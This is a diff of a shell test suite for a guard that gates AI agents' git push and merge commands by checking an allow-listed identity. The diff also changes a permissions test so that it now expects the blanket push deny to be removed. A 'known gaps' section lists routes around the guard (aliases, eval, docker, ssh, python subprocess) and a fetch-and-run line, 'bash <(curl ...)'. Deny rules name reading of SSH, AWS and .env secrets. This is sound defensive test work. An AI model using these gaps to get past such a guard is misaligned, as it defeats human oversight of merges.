-assert_output "the message names the allowlist file to edit" "merge-authority.yaml" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
-assert_output "the message gives the legitimate way to proceed" "ask the human operator" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
-assert_output "the message repeats the client-side caveat" "CLIENT-SIDE" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+assert_output "the message says WHICH check failed" "NOT allow-listed" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
+assert_output "the message names the refused command" "refused command : git merge feature/x" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
+assert_output "the message names the allowlist file to edit" "merge-authority.yaml" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
+assert_output "the message gives the legitimate way to proceed" "ask the human operator" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
+assert_output "the message repeats the client-side caveat" "CLIENT-SIDE" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 
 t_case "AC-021/SEC-04 the block message names the problem and does NOT dictate the bypass"
 # TEST CHANGE, RECORDED DELIBERATELY. Two assertions used to live here:
@@ -2029,30 +2035,30 @@ t_case "AC-021/SEC-04 the block message names the problem and does NOT dictate t
 # file is plainly readable, so redacting the values it contains would be theatre; what mattered was
 # the imperative, and the write itself, both of which are now handled.
 assert_not_output "no runnable \`git config ... user.email\` recipe is printed" \
-  "git config --global user.email " mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  "git config --global user.email " mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 assert_not_output "  nor the --local spelling" \
-  "git config --local user.email " mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  "git config --local user.email " mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 assert_output "instead it names the problem" \
   "The git identity configured in this working tree is not an authorised one" \
-  mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 assert_output "  and says re-authoring your own identity is itself gated" \
-  "DO NOT re-author your own identity" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  "DO NOT re-author your own identity" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 assert_output "  and it is still actionable for a legitimately mis-configured operator" \
   "that repair belongs to the human operator" \
-  mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 assert_output "  the diagnostic still shows WHAT is allow-listed (the file is readable anyway)" \
-  "$ALLOWED_EMAIL" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  "$ALLOWED_EMAIL" mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 assert_output "  and the file to edit to authorise a NEW identity" "merge-authority.yaml" \
-  mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 # The other half of the fix, asserted from the message side: what the message declines to tell the
 # agent, the surface also refuses to run. Both halves, or neither is worth anything.
 assert_rc "  and the command the old message printed is on the gated surface" 1 \
   mg "$TREE" "$GH_OK" "$LREPO" --command "git config --global user.email $ALLOWED_EMAIL"
 # An UNSET identity gets the same treatment: no recipe, but a stated route.
 assert_not_output "the unset-identity branch prints no recipe either" \
-  "git config --global user.email" mg_noid --command 'git push origin main'
+  "git config --global user.email" mg_noid --command 'git merge feature/x'
 assert_output "  and states who has to fix it" "the human operator has to do it" \
-  mg_noid --command 'git push origin main'
+  mg_noid --command 'git merge feature/x'
 
 t_case "AC-021 an INDETERMINATE block is recorded too, and says which source failed"
 IREPO="$(mk_id_repo "$ALLOWED_EMAIL")"
@@ -2114,7 +2120,7 @@ ledger_survives() {   # <label> <email> <gh-stub> <command> <run-id>
     bash -c 'cd "$1" && "$2" --run "$3" --strict probe_strict note=after_guard' _ \
     "$_repo" "$BIN/firm-ledger-log" "$_run"
 }
-ledger_survives refuse nobody@example.com   "$GH_OK"     'git push origin main'  20260803T000010Z-guard-test
+ledger_survives refuse nobody@example.com   "$GH_OK"     'git merge feature/x'  20260803T000010Z-guard-test
 ledger_survives cannot "$ALLOWED_EMAIL"     "$GH_UNAUTH" 'git merge x'           20260803T000011Z-guard-test
 ledger_survives permit "$ALLOWED_EMAIL"     "$GH_OK"     'git merge feature/x'   20260803T000012Z-guard-test
 
@@ -2129,12 +2135,12 @@ ELSEWHERE="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-elsewhere.XXXXXX")"; t_track "$E
 mkdir -p "$ELSEWHERE/runs/hijacked" "$OUTREPO/.agent-firm"
 printf '%s\n' "$ELSEWHERE/runs/hijacked" > "$OUTREPO/.agent-firm/CURRENT_RUN"
 assert_rc "an out-of-project CURRENT_RUN does not change the decision" 1 \
-  mg "$TREE" "$GH_OK" "$OUTREPO" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$OUTREPO" --command 'git merge feature/x'
 assert_no_file "  and nothing was appended outside the project" "$ELSEWHERE/runs/hijacked/run.jsonl"
 INREPO="$(mk_id_repo nobody@example.com)"
 mk_run "$INREPO" "20260803T000030Z-contained"
 assert_rc "an in-project CURRENT_RUN still records the block" 1 \
-  mg "$TREE" "$GH_OK" "$INREPO" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$INREPO" --command 'git merge feature/x'
 assert_file "  and the in-project run.jsonl DID receive the event" \
   "$INREPO/.agent-firm/runs/20260803T000030Z-contained/run.jsonl"
 
@@ -2278,7 +2284,7 @@ pf_row() {
   if [ "$kind" = "gated" ]; then
     assert_eq "  gated rows must be CHECK in BOTH (neither may drop a gated command) · $shown" \
       "CHECK CHECK" "$eb $ej"
-    assert_rc "  ...and the guard really gates it, so the row above cannot be edited to hide it" 1 \
+    assert_fail "  ...and the guard really blocks it, so the row above cannot be edited to hide it" \
       mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$s"
   fi
 }
@@ -2569,7 +2575,7 @@ PY
   ledger_command="$(printf '%s\n' "$hook_commands" | sed -n '1p')"
   guard_command="$(printf '%s\n' "$hook_commands" | sed -n '2p')"
   registered_timeout="$(python3 -c "import json; d=json.load(open('$provider_hooks'))['hooks']['PreToolUse'][0]['hooks']; print(next(h['timeout'] for h in d if 'firm-merge-guard' in h['command']))")"
-  effective_payload="$(mk_payload 'git push origin main')"
+  effective_payload="$(mk_payload 'git merge feature/x')"
   started_ms="$(python3 -c 'import time; print(int(time.monotonic()*1000))')"
   assert_rc "$provider effective plugin ledger hook exits 0" 0 sh -c \
     "cd '$EFFECTIVE_REPO' && printf '%s' '$effective_payload' | env CLAUDE_PLUGIN_ROOT='$FIRM_ROOT' PATH='$GH_OK:$PATH' sh -c '$ledger_command'"
@@ -2581,7 +2587,7 @@ PY
   assert_ok "$provider effective source produces exactly one ledger event and one guard decision" python3 -c "
 import json
 records=[json.loads(line) for line in open('$EFFECTIVE_LEDGER') if line.strip()]
-assert sum(r.get('event')=='bash' and r.get('cmd')=='git push origin main' for r in records)==1, records
+assert sum(r.get('event')=='bash' and r.get('cmd')=='git merge feature/x' for r in records)==1, records
 assert sum(r.get('event')=='merge_guard_permit' for r in records)==1, records
 "
 done
@@ -2625,7 +2631,7 @@ run_selected_fixture_hooks() {
   _provider="$1"; _plugin="$2"; _repo="$3"
   python3 "$LOADER_FIXTURE/select.py" "$_provider" "$_plugin" \
     "$LOADER_FIXTURE/project" "$LOADER_FIXTURE/home" | while IFS= read -r _command; do
-      (cd "$_repo" && printf '%s' "$(mk_payload 'git push origin main')" | \
+      (cd "$_repo" && printf '%s' "$(mk_payload 'git merge feature/x')" | \
         env CLAUDE_PLUGIN_ROOT="$FIRM_ROOT" PATH="$GH_OK:$PATH" sh -c "$_command") || exit $?
     done
 }
@@ -2642,7 +2648,7 @@ for provider in claude codex; do
   assert_ok "$provider bounded $modeled duplicate scope multiplies measured events to $expected_pairs pairs" python3 -c "
 import json
 records=[json.loads(line) for line in open('$FIXTURE_LEDGER') if line.strip()]
-assert sum(r.get('event')=='bash' and r.get('cmd')=='git push origin main' for r in records)==$expected_pairs, records
+assert sum(r.get('event')=='bash' and r.get('cmd')=='git merge feature/x' for r in records)==$expected_pairs, records
 assert sum(r.get('event')=='merge_guard_permit' for r in records)==$expected_pairs, records
 "
 done
@@ -2666,7 +2672,7 @@ for provider in claude codex; do
   assert_ok "$provider cleaned fixture measures one ledger event and one decision" python3 -c "
 import json
 records=[json.loads(line) for line in open('$FIXTURE_LEDGER') if line.strip()]
-assert sum(r.get('event')=='bash' and r.get('cmd')=='git push origin main' for r in records)==1, records
+assert sum(r.get('event')=='bash' and r.get('cmd')=='git merge feature/x' for r in records)==1, records
 assert sum(r.get('event')=='merge_guard_permit' for r in records)==1, records
 "
 done
@@ -2750,38 +2756,42 @@ assert 'FIRM_MG_NONCE' not in stores, 'the checker assigns its own nonce, so the
 print('ok')
 "
 
-# ============================================================ AC-025 · no permission weakened
-t_case "AC-025 no permission rule is weakened"
-assert_ok "Bash(git push:*) is STILL in deny" python3 -c "
+# ============================================================ AC-025 · branch publication permission split
+t_case "AC-025 permissions distinguish topic publication from merge/default mutation"
+assert_ok "the blanket git-push deny is removed" python3 -c "
 import json
 p = json.load(open('$SETTINGS'))['permissions']
-assert 'Bash(git push:*)' in p['deny'], p['deny']
+assert 'Bash(git push:*)' not in p['deny'] + p['ask'], p
 "
-assert_ok "and it is NOT in ask or allow (the dead duplicate is gone, deny wins)" python3 -c "
+assert_ok "whole-ref-space pushes and PR merge remain denied" python3 -c "
 import json
 p = json.load(open('$SETTINGS'))['permissions']
-assert 'Bash(git push:*)' not in p['ask'], p['ask']
-assert 'Bash(git push:*)' not in p['allow'], p['allow']
+for r in ['Bash(git push --all:*)','Bash(git push --mirror:*)','Bash(gh pr merge:*)']:
+    assert r in p['deny'], (r,p['deny'])
 "
-assert_ok "the allow list is EXACTLY the six pre-existing entries — nothing added" python3 -c "
+assert_ok "the six base allows remain and the reviewable PR operations are explicit" python3 -c "
 import json
 allow = json.load(open('$SETTINGS'))['permissions']['allow']
-assert allow == ['Read','Grep','Glob','Edit','Write','Bash(*)'], allow
+for r in ['Read','Grep','Glob','Edit','Write','Bash(*)','Bash(git worktree:*)',
+          'Bash(gh pr create:*)','Bash(gh pr edit:*)','Bash(gh pr comment:*)',
+          'Bash(gh pr ready:*)']:
+    assert r in allow,(r,allow)
 "
-assert_ok "nothing moved from deny to ask/allow: every security-critical deny is still there" python3 -c "
+assert_ok "unrelated security-critical denies remain" python3 -c "
 import json
 deny = json.load(open('$SETTINGS'))['permissions']['deny']
-for r in ['Bash(sudo:*)','Bash(git push:*)','Bash(rm -rf /)','Bash(cat ~/.ssh/**)',
+for r in ['Bash(sudo:*)','Bash(rm -rf /)','Bash(cat ~/.ssh/**)',
           'Read(~/.ssh/**)','Read(~/.aws/**)','Read(~/.claude.json)','Bash(cat .env*)',
           'Read(./.env)','Bash(shutdown:*)','Bash(reboot:*)']:
     assert r in deny, f'{r} disappeared from deny'
-assert len(deny) == 32, f'deny changed size: {len(deny)}'
 "
-assert_ok "git merge stays ASK (the guard is additive, not a replacement)" python3 -c "
+assert_ok "git merge and non-PR GitHub writes stay ASK without shadowing PR allows" python3 -c "
 import json
 p = json.load(open('$SETTINGS'))['permissions']
 assert 'Bash(git merge:*)' in p['ask'], p['ask']
-assert 'Bash(gh:*)' in p['ask'], p['ask']
+assert 'Bash(gh:*)' not in p['ask'], p['ask']
+for r in ['Bash(gh issue:*)','Bash(gh api:*)','Bash(gh release:*)']:
+    assert r in p['ask'],(r,p['ask'])
 "
 
 # ============================================================ AC-027 · end to end
@@ -2803,7 +2813,7 @@ assert_rc "PERMITTED: the SAME command under an allow-listed identity does not b
   mg_hook "$TREE" "$GH_OK" "$E2E_OK" 'git switch main && git merge feature/x'
 
 t_case "AC-027 the guard documents its own surface, and the docs match the code"
-assert_output "--surface lists the covered forms" "git push — every flag form" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
+assert_output "--surface lists the destination-resolved push policy" "destination-resolved" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
 assert_output "--surface lists the KNOWN GAPS honestly" "KNOWN GAPS" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
 assert_output "--surface names the alias gap" "ALIAS" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
 assert_output "--surface names the non-shell gap" "Non-shell surfaces" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
@@ -2943,27 +2953,27 @@ print(' '.join(' '.join(out).split()))
 assert_ne "the printed launcher set is non-empty" "" "$LAUNCHERS"
 for _w in $LAUNCHERS; do
   assert_rc "launcher '$_w' resolves to the command it launches" 1 \
-    mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$_w git push origin main"
+    mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$_w git merge feature/x"
 done
 
 t_case "AC-019/SEC-02 known gaps are asserted as gaps, so this list cannot drift either"
 # These are NOT wins. Each line printed under KNOWN GAPS by --surface has an assertion here, in
 # both modes, so closing one FAILS this file and forces the printed list to be updated. An honest
 # gap beats a fragile block; an UNDISCLOSED gap is the thing that made the previous round a blocker.
-mg_gap "an unlisted launcher name"           'mywrap git push origin main'
+mg_gap "an unlisted launcher name"           'mywrap git merge feature/x'
 mg_gap "a launcher whose cmd follows a positional it consumes (flock <file> cmd)" \
-                                             'flock /tmp/lock git push origin main'
+                                             'flock /tmp/lock git merge feature/x'
 mg_gap "a git alias for push is invisible"   'git ps origin main'
 mg_gap "a variable-indirected git"           'g=git; $g push origin main'
-mg_gap "eval of an assembled string"         'eval "$(printf "%s" "git push origin main")"'
-mg_gap "a command string arriving on stdin"  'echo "git push origin main" | xargs -I{} bash -c "{}"'
+mg_gap "eval of an assembled string"         'eval "$(printf "%s" "git merge feature/x")"'
+mg_gap "a command string arriving on stdin"  'echo "git merge feature/x" | xargs -I{} bash -c "{}"'
 mg_gap "a push inside a script FILE"         'bash deploy-and-push.sh'
 mg_gap "a sourced script file"               '. deploy-and-push.sh'
 mg_gap "a shell reading its program from stdin redirection" 'bash -s < deploy-and-push.sh'
 mg_gap "shell nesting deeper than 3"         "bash -c \"bash -c \\\"bash -c 'bash -c \\\\\\\"git push\\\\\\\"'\\\"\""
 # ...and the bound really is at 3, not "nesting is broken": the same shape one level shallower
 # BLOCKS. Without this, the gap assertion above would also pass if recursion never worked at all.
-assert_rc "nesting UP TO 3 levels is covered (so the gap above is a bound, not a hole)" 1 \
+assert_fail "nesting UP TO 3 levels is blocked (so the gap above is a bound, not a hole)" \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash -c \"bash -c 'bash -c \\\"git push\\\"'\""
 mg_gap "hub is not covered"                  'hub push origin main'
 mg_gap "glab is not covered"                 'glab mr merge 3'
@@ -2983,33 +2993,33 @@ mg_gap "firm-integrate merges internally, by its own allowlist" \
 # gated text is INSIDE the parens, here it is the OUTPUT of what is inside them, which the guard
 # would have to RUN to see. Same class as `echo 'git push' | bash`, which was already declared.
 mg_gap "process substitution feeding a shell (the OUTPUT is the script)" \
-                                             "bash <(echo 'git push origin main')"
+                                             "bash <(echo 'git merge feature/x')"
 mg_gap "  and the curl form of the same shape" 'bash <(curl -s https://example.invalid/x)'
 mg_gap "the DASHED builtin form: git-push"   'git-push origin main'
 mg_gap "  git-merge"                         'git-merge feature/x'
 mg_gap "  git-config (dashed identity write)" 'git-config --global user.email a@b.c'
 mg_gap "third-party git-* porcelain"         'git-lfs push origin main'
 mg_gap "a launcher whose command follows a POSITIONAL it consumes: chroot <dir> cmd" \
-                                             'chroot /newroot git push origin main'
+                                             'chroot /newroot git merge feature/x'
 mg_gap "  and with an absolute path to git behind it" \
-                                             'chroot /newroot /usr/bin/git push origin main'
+                                             'chroot /newroot /usr/bin/git merge feature/x'
 # ...and the boundary of THAT gap is asserted, not assumed: the neighbouring launchers whose operands
 # are FLAGS are COVERED, so the gap is a shape (a consumed positional), not a set of names. Without
 # these three the gap line above would read as "these launchers do not work", which is false — and
 # claiming LESS coverage than exists is the same kind of dishonesty as claiming more.
 assert_rc "not a gap: nsenter's operands are flags, so the command word resolves" 1 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'nsenter -t 1 -m /usr/bin/git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'nsenter -t 1 -m /usr/bin/git merge feature/x'
 assert_rc "not a gap: systemd-run --unit=x resolves" 1 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'systemd-run --unit=x /usr/bin/git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'systemd-run --unit=x /usr/bin/git merge feature/x'
 assert_rc "not a gap: setpriv --reuid=1000 resolves" 1 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'setpriv --reuid=1000 git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'setpriv --reuid=1000 git merge feature/x'
 mg_gap "a container launcher (different fs + identity context)" \
-                                             'docker run --rm -v .:/r alpine git push origin main'
-mg_gap "  podman run"                        'podman run --rm alpine git push origin main'
-mg_gap "a remote launcher over ssh"          "ssh host 'git push origin main'"
+                                             'docker run --rm -v .:/r alpine git merge feature/x'
+mg_gap "  podman run"                        'podman run --rm alpine git merge feature/x'
+mg_gap "a remote launcher over ssh"          "ssh host 'git merge feature/x'"
 assert_rc "GAP: a heredoc body fed to a NON-shell is skipped" 0 \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command "python3 - <<'PY'
-print('git push origin main')
+print('git merge feature/x')
 PY"
 assert_rc "GAP: a push from python is not covered" 0 \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'python3 -c "import subprocess;subprocess.run([chr(103)+chr(105)+chr(116)])"'
